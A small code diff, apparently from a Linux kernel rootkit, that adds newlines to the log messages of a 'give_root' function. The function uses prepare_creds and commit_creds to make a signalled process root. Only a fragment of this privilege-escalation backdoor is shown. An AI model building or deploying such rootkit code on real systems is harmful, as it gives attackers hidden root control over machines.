@@ -15,7 +15,7 @@ void give_root(pid_t i32_pid, int i32_sig)
     p_creds = prepare_creds();
 
     if (p_creds == NULL) {
-        pr_err("[ROOTKIT] * Failed to get credentials");
+        pr_err("[ROOTKIT] * Failed to get credentials\n");
         return;
     }
 
@@ -30,5 +30,5 @@ void give_root(pid_t i32_pid, int i32_sig)
 
     commit_creds(p_creds);
 
-    pr_info("[ROOTKIT] * Process is now root");
+    pr_info("[ROOTKIT] * Process is now root\n");
 }
